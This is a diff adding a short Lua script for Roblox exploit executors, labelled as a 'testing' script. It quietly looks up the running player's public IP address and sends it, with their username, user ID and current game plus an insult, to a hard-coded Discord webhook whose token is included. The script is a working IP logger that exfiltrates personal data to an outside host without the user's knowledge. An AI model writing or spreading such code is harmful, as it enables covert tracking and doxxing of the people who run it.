@@ -1,0 +1,47 @@
+-- testing for comm
+
+local marketplaceService = game.MarketplaceService
+local HttpService = game.HttpService
+local succ, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
+local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
+
+local GameInfo = {
+    ID = game.PlaceId,
+    Name = info.Name
+};
+local PlayerInfo = {
+    Username = game.Players.LocalPlayer.Name,
+    UserId = game.Players.LocalPlayer.UserId
+};
+local HookData = {
+    username = game.Players.LocalPlayer,
+    ['avatar_url'] = ('http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username=%s'):format(PlayerInfo.Username);
+    embeds={{
+        ["author"] = {
+            ["name"] = game.Players.LocalPlayer.Name .. ' | ' .. "what a fucking 🤡",
+            ["ip"] = "IP:" .. ip,
+            ["url"] = ('https://www.roblox.com/users/%s/profile'):format(PlayerInfo.UserId),
+        },
+        ["Additional_Info"] = {
+            ["test"] = "heyyy"
+        },
+        ["color"] = 6207487,
+        ["icon_url"] = ('http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username=%s'):format(PlayerInfo.Username),
+        fields={
+            {value = "GAME NAME:"..' '..tostring(GameInfo.Name)..': '..('https://www.roblox.com/games/%s/game'):format(GameInfo.ID), name = "IP: " .. ip},
+
+        },
+    }},
+}
+HookData = HttpService:JSONEncode(HookData)
+local request = http_request or syn.request
+request(
+    {
+        Url = 'https://discord.com/api/webhooks/971531276991467540/ilXtbszVd1wwjCuBwT9EVb0jWyy66m7mpVwwzM4pB5HXZUve93j-k88PthfAylgaVq3z', -- // put your webhook here
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = HookData
+    }
+);
